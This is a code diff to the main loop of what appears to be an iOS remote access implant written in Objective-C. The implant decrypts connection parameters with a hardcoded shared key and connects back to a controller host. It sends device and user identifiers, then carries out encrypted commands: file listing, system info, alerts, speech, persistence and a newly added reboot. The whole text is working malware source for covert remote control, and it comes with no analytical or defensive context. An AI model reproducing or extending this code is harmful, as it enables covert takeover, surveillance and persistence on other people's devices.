@@ -23,28 +23,37 @@ int main(int argc, char **argv, char **envp) {
     
     [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];
 
-    //decrypt argument to connectback
+    if (argc == 1) { return 0; }
+    //decrypt argument with shared key
     NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
-    NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:argument options:0];
-    argument = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
-    argument = [FBEncryptorAES decryptBase64String:argument keyString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"]; //shared decryption key
+    HBLogDebug(@"encrypted argument = %@",argument);
+    argument = [escryptor decryptB64ToNSString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV" :argument];
+    HBLogDebug(@"checking if null");
+    if (argument == NULL) {
+        HBLogDebug(@"its nil on the why");
+    }
+    //obtain real args from decrypted argument
     NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+    //connect to host:port args
+    HBLogDebug(@"connecting");
     int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
+    //set escryptor key from args
     _espl.skey = args[2];
-    _espl.terminator = args[3];
-    
-    if (success != -1) {
+    //set terminator from args
+    _espl.terminator = [args[3] substringToIndex:16];
+    //check if connection was accepted
+    if (success == -1) {
+        HBLogDebug(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
+    }
+    else {
         NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[[_espl thisUIDevice] identifierForVendor],NSUserName(),[[_espl thisUIDevice] name]];
         [_espl sendString:name];
-        NSString *recvData;
+        NSString *command;
         char buffer[2048];
         while (read(sockfd, &buffer, sizeof(buffer))) {
-            recvData = [NSString stringWithFormat:@"%s",buffer];
-            recvData = [recvData stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
-            recvData = [FBEncryptorAES decryptBase64String:recvData keyString:_espl.skey];
-            
-            //ARGUMENTS of command
-            NSArray *cmdarray = [recvData componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+            command = [NSString stringWithFormat:@"%s",buffer];
+            command = [escryptor decryptB64ToNSString:_espl.skey :command];
+            NSArray *cmdarray = [command componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
         
             if ([cmdarray[0] isEqualToString: @"exit"]) {
                 exit(1);
@@ -57,6 +66,9 @@ int main(int argc, char **argv, char **envp) {
             }
             else if ([cmdarray[0] isEqualToString: @"alert"]) {
                 [_espl alert:cmdarray];
+            }
+            else if ([cmdarray[0] isEqualToString: @"reboot"]) {
+                [_espl exec:@"reboot"];
             }
             else if ([cmdarray[0] isEqualToString: @"ls"]) {
                 [_espl directoryList:cmdarray];
@@ -117,7 +129,7 @@ int main(int argc, char **argv, char **envp) {
                 [_espl sysinfo];
             }
             else if ([cmdarray[0] isEqualToString: @"say"]) {
-                [_espl say:[recvData stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
+                [_espl say:[command stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
             }
             else if ([cmdarray[0] isEqualToString: @"persistence"]) {
                 [_espl persistence:[NSString stringWithFormat:@"%@",args[0]]:atoi([args[1] UTF8String])];
@@ -152,9 +164,6 @@ int main(int argc, char **argv, char **envp) {
             //clear the received data
             memset(buffer,'\0',2048);
         }
-    }
-    else {
-        HBLogDebug(@"unsuccessfull connecting");
     }
 	return 0;
 }
